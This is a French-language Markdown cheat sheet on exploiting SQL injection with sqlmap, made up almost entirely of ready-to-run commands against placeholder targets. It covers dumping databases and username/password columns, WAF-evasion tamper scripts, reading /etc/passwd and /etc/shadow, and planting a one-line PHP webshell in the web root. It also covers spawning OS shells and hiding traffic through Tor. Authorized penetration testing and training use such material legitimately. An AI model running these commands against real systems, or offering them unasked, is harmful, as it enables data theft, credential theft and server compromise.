# 💉 SQLMap - Guide Avancé

Guide exhaustif pour l'exploitation avancée des injections SQL avec SQLMap.

---

## 📖 Concepts de Base

## 1️⃣ Utilisation Basique
```bash

-r fichier requête
-p paramètre à tester
--dbmstype de base de données
--dbs liste toutes les bases de données
--technique=T injection Time-based (aveugle)
--dump extraire les données
-D zmbase de données cible
-T Userstable cible
-C colonnes à extraire
--batch = mode automatique, répond automatiquement "oui" à tout.

```
### Détection simple

```bash
# Test GET parameter
sqlmap -u "http://target.com/page.php?id=1"

# Test POST parameter
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# Depuis un fichier de requête (Burp)
sqlmap -r request.txt

# Tester un paramètre spécifique
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id
```

### Options essentielles

```bash
# Niveau et risque (plus haut = plus de tests)
sqlmap -u URL --level=5 --risk=3

# Forcer le DBMS
sqlmap -u URL --dbms=mysql
sqlmap -u URL --dbms=mssql
sqlmap -u URL --dbms=oracle
sqlmap -u URL --dbms=postgresql

# Verbose
sqlmap -u URL -v 3  # 0-6

# Threads (plus rapide)
sqlmap -u URL --threads=10

# Timeout
sqlmap -u URL --timeout=30

# Random User-Agent
sqlmap -u URL --random-agent
```

---

## 2️⃣ Extraction de Données

### Énumération de la base

```bash
# Bannière du DBMS
sqlmap -u URL --banner

# Utilisateur courant
sqlmap -u URL --current-user

# Base de données courante
sqlmap -u URL --current-db

# Lister toutes les bases
sqlmap -u URL --dbs

# Lister les tables d'une base
sqlmap -u URL -D database_name --tables

# Lister les colonnes d'une table
sqlmap -u URL -D database_name -T table_name --columns

# Dumper une table
sqlmap -u URL -D database_name -T table_name --dump

# Dumper des colonnes spécifiques
sqlmap -u URL -D database_name -T users -C username,password --dump

# Dumper toutes les bases
sqlmap -u URL --dump-all

# Exclure les bases système
sqlmap -u URL --dump-all --exclude-sysdbs
```

### Options de dump

```bash
# Limiter le nombre de lignes
sqlmap -u URL -D db -T table --dump --start=1 --stop=100

# Format CSV
sqlmap -u URL -D db -T table --dump --dump-format=CSV

# Chercher dans les colonnes
sqlmap -u URL --search -C password

# Chercher dans les tables
sqlmap -u URL --search -T user

# Dumper les utilisateurs et mots de passe (le plus important)
sqlmap -r rqt.txt -p "tid" --batch --technique=T \
  -D "NOM DE LA DB" -T Users -C Username,Password --dump
```

---

## 3️⃣ Techniques d'Injection

### Spécifier les techniques

```bash
# --technique=TECHNIQUE
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries

# Seulement Union
sqlmap -u URL --technique=U

# Boolean et Time-based
sqlmap -u URL --technique=BT

# Toutes les techniques
sqlmap -u URL --technique=BEUSTQ
```

### Union-based tuning

```bash
# Nombre de colonnes (si connu)
sqlmap -u URL --union-cols=5

# Caractère de commentaire
sqlmap -u URL --union-char='#'

# Table pour FROM
sqlmap -u URL --union-from=users
```

### Time-based tuning

```bash
# Délai pour time-based (défaut: 5s)
sqlmap -u URL --time-sec=10

# Technique de délai
# --technique=T force time-based
```

---

## 4️⃣ Bypass de WAF/Filtres

### Tamper Scripts

```bash
# Lister les tampers disponibles
sqlmap --list-tampers

# Utiliser un tamper
sqlmap -u URL --tamper=space2comment

# Plusieurs tampers
sqlmap -u URL --tamper=space2comment,between,randomcase

# Tampers courants pour bypass
--tamper=apostrophemask      # UTF-8 pour '
--tamper=base64encode        # Encode en base64
--tamper=between             # BETWEEN au lieu de >
--tamper=charencode          # URL encode
--tamper=charunicodeencode   # Unicode encode
--tamper=equaltolike         # LIKE au lieu de =
--tamper=greatest            # GREATEST() au lieu de >
--tamper=ifnull2ifisnull     # IFNULL → IF(ISNULL())
--tamper=modsecurityversioned # Bypass ModSecurity
--tamper=modsecurityzeroversioned
--tamper=multiplespaces      # Espaces multiples
--tamper=nonrecursivereplacement
--tamper=percentage          # % devant chaque char
--tamper=randomcase          # Casse aléatoire
--tamper=randomcomments      # /* */ aléatoires
--tamper=securesphere        # Bypass SecureSphere
--tamper=space2comment       # /**/ au lieu d'espace
--tamper=space2dash          # -- au lieu d'espace
--tamper=space2hash          # # au lieu d'espace
--tamper=space2mssqlblank    # Chars alternatifs (MSSQL)
--tamper=space2mysqlblank    # Chars alternatifs (MySQL)
--tamper=space2plus          # + au lieu d'espace
--tamper=space2randomblank   # Blanks aléatoires
--tamper=unionalltounion     # UNION ALL → UNION
--tamper=unmagicquotes       # Bypass magic_quotes
--tamper=versionedkeywords   # MySQL versioned comments
--tamper=versionedmorekeywords
```

### Combinaisons efficaces

```bash
# Bypass WAF générique
sqlmap -u URL --tamper=space2comment,between,randomcase --random-agent

# Bypass ModSecurity
sqlmap -u URL --tamper=modsecurityversioned,space2comment

# MySQL avec filtres
sqlmap -u URL --tamper=space2mysqlblank,between,percentage

# MSSQL avec filtres
sqlmap -u URL --tamper=space2mssqlblank,charencode
```

### Autres options de bypass

```bash
# Chunked encoding
sqlmap -u URL --chunked

# HPP (HTTP Parameter Pollution)
sqlmap -u URL --hpp

# Null bytes
sqlmap -u URL --null-connection

# Skip URL encoding
sqlmap -u URL --skip-urlencode

# Délai entre requêtes
sqlmap -u URL --delay=1

# Safe URL (requête normale entre les tests)
sqlmap -u URL --safe-url="http://target.com/safe" --safe-freq=3
```

---

## 5️⃣ Accès au Système

### Lecture de fichiers

```bash
# Lire un fichier
sqlmap -u URL --file-read="/etc/passwd"
sqlmap -u URL --file-read="C:/Windows/win.ini"

# Fichiers courants
--file-read="/etc/passwd"
--file-read="/etc/shadow"
--file-read="/var/www/html/config.php"
--file-read="C:/inetpub/wwwroot/web.config"
```

### Écriture de fichiers

```bash
# Écrire un fichier (nécessite FILE privilege)
sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Webshell simple
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Exécution de commandes OS

```bash
# Shell interactif (si possible)
sqlmap -u URL --os-shell

# Commande spécifique
sqlmap -u URL --os-cmd="whoami"

# Powershell (Windows)
sqlmap -u URL --os-pwn
```

### SQL Shell

```bash
# Shell SQL interactif
sqlmap -u URL --sql-shell

# Requête SQL spécifique
sqlmap -u URL --sql-query="SELECT user()"
```

---

## 6️⃣ Options Avancées

### Authentification

```bash
# Basic Auth
sqlmap -u URL --auth-type=Basic --auth-cred="user:password"

# Digest Auth
sqlmap -u URL --auth-type=Digest --auth-cred="user:password"

# NTLM Auth
sqlmap -u URL --auth-type=NTLM --auth-cred="domain\user:password"

# Cookie
sqlmap -u URL --cookie="PHPSESSID=abc123; security=low"

# Header personnalisé
sqlmap -u URL --headers="X-Forwarded-For: 127.0.0.1\nX-Custom: value"
```

### Proxy

```bash
# Via proxy
sqlmap -u URL --proxy="http://127.0.0.1:8080"

# Proxy avec auth
sqlmap -u URL --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass"

# Tor
sqlmap -u URL --tor --tor-type=SOCKS5 --check-tor
```

### Second Order Injection

```bash
# L'injection est stockée, résultat sur autre page
sqlmap -u "http://target.com/register" --data="user=test*" \
    --second-url="http://target.com/profile" \
    --second-req="profile_request.txt"
```

### Injection dans différents endroits

```bash
# Header injection
sqlmap -u URL --headers="X-Forwarded-For: 1*"

# Cookie injection
sqlmap -u URL --cookie="id=1*"

# User-Agent injection
sqlmap -u URL -A "Mozilla/5.0*"

# Referer injection
sqlmap -u URL --referer="http://test.com/?id=1*"

# * marque le point d'injection
```

---

## 7️⃣ Optimisation

### Performance

```bash
# Threads
sqlmap -u URL --threads=10

# Keep-alive
sqlmap -u URL --keep-alive

# Pas de cast (plus rapide)
sqlmap -u URL --no-cast

# Null connection
sqlmap -u URL --null-connection

# Prédire le nombre de colonnes
sqlmap -u URL --union-cols=12-16
```

### Output

```bash
# Output directory
sqlmap -u URL -o /tmp/sqlmap_output

# Format de sortie
sqlmap -u URL --dump --dump-format=HTML

# Flush session (recommencer)
sqlmap -u URL --flush-session

# Fresh queries
sqlmap -u URL --fresh-queries
```

---

## 8️⃣ Cas Pratiques

### Injection dans JSON

```bash
# POST avec JSON
sqlmap -u "http://api.target.com/search" \
    --data='{"query":"test"}' \
    --headers="Content-Type: application/json" \
    -p query
```

### Injection dans XML

```bash
sqlmap -u "http://api.target.com/search" \
    --data='<request><query>test</query></request>' \
    --headers="Content-Type: application/xml"
```

### Injection dans REST API

```bash
# Paramètre dans l'URL
sqlmap -u "http://api.target.com/users/1*/profile" --method=GET

# PUT/DELETE
sqlmap -u "http://api.target.com/users" \
    --data='{"id":1}' \
    --method=PUT \
    --headers="Content-Type: application/json"
```

### Injection WebSocket

```bash
# Sauvegarder la requête WS comme HTTP
# Puis utiliser -r request.txt
sqlmap -r ws_request.txt
```

---

## 9️⃣ Cheatsheet Rapide

```bash
# Basique
sqlmap -u "URL?id=1"
sqlmap -u "URL" --data="param=value"
sqlmap -r request.txt

# Énumération
sqlmap -u URL --dbs
sqlmap -u URL -D db --tables
sqlmap -u URL -D db -T table --columns
sqlmap -u URL -D db -T table -C col1,col2 --dump

# Bypass WAF
sqlmap -u URL --tamper=space2comment,between --random-agent
sqlmap -u URL --level=5 --risk=3

# Accès système
sqlmap -u URL --os-shell
sqlmap -u URL --file-read="/etc/passwd"
sqlmap -u URL --file-write="shell.php" --file-dest="/var/www/shell.php"

# Auth
sqlmap -u URL --cookie="session=abc"
sqlmap -u URL --headers="Authorization: Bearer token"

# Proxy
sqlmap -u URL --proxy="http://127.0.0.1:8080"

# Optimisation
sqlmap -u URL --threads=10 --technique=BEU

# Injection personnalisée
sqlmap -u URL --prefix="'" --suffix="-- -"
```

---

## 📚 Ressources

- **SQLMap GitHub** : https://github.com/sqlmapproject/sqlmap
- **SQLMap Wiki** : https://github.com/sqlmapproject/sqlmap/wiki
- **Usage Guide** : https://github.com/sqlmapproject/sqlmap/wiki/Usage
- **Tamper Scripts** : https://github.com/sqlmapproject/sqlmap/tree/master/tamper

---

**Tags:** `#sqlmap #sql-injection #database #exploitation #tamper #waf-bypass #dump`
